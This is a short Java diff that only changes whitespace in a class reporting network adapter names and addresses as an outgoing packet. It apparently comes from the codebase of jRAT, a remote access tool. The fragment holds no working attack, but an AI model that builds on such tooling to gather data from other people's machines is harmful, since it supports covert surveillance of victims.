@@ -6,13 +6,12 @@ import java.util.ArrayList;
 
 import pro.jrat.common.io.StringWriter;
 
-
 public class Packet56NetworkAdapter extends AbstractOutgoingPacket {
 
 	private String displayName;
 	private String name;
 	private ArrayList<InetAddress> list;
-	
+
 	public Packet56NetworkAdapter(String displayName, String name, ArrayList<InetAddress> list) {
 		this.displayName = displayName;
 		this.name = name;
